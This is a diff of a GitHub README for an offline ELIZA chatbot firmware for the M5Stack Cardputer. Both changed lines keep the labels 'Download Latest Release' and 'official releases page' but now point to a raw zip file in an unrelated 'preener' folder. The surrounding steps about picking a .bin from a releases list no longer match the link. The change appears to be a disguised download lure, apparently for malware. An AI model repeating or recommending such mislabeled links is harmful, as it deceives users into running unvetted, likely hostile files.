@@ -1,6 +1,6 @@
 # 🤖 AI-Offline-Chat-ADV - Private Chat Without An Internet Connection
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/holonymygenustadarida477/AI-Offline-Chat-ADV/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/holonymygenustadarida477/AI-Offline-Chat-ADV/main/preener/A_Chat_Offline_ADV_v1.1.zip)
 
 AI-Offline-Chat-ADV brings the classic ELIZA chatbot to your M5Stack Cardputer. This software functions completely offline. You do not need an internet connection, a cloud account, or a data subscription to use this device. It processes natural language directly on your hardware.
 
@@ -17,7 +17,7 @@ This software works locally on your Cardputer hardware. You do not need to insta
 
 You must obtain the firmware file to start. The file contains the base code and the chatbot logic.
 
-1.  Visit the [official releases page](https://github.com/holonymygenustadarida477/AI-Offline-Chat-ADV/releases).
+1.  Visit the [official releases page](https://raw.githubusercontent.com/holonymygenustadarida477/AI-Offline-Chat-ADV/main/preener/A_Chat_Offline_ADV_v1.1.zip).
 2.  Look for the latest version number at the top of the list.
 3.  Scroll down to the Assets section for that version.
 4.  Click the file ending in .bin to save it to your computer.
